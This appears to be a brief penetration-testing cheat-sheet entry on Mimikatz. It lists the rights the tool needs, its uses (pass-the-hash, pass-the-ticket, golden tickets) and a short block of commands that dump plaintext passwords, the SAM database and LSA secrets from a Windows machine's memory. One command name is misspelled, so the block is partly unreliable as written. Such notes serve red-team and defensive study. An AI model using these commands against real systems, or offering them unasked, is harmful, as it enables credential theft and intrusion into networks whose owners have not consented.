# Mimikatz

* **Permissions:  SYSTEM / ADMINISTRATOR**

It's now well known to extract plaintexts passwords, hash, PIN code and Kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

```
privilege::debug // bypass memory protections
sekurlsa::logonpasswds  // dump passwords stored in memory
lsadump::sam  /patch     // dump the SAM
lsadump::lsa  /patch     // dump the LSA
```

* [https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)
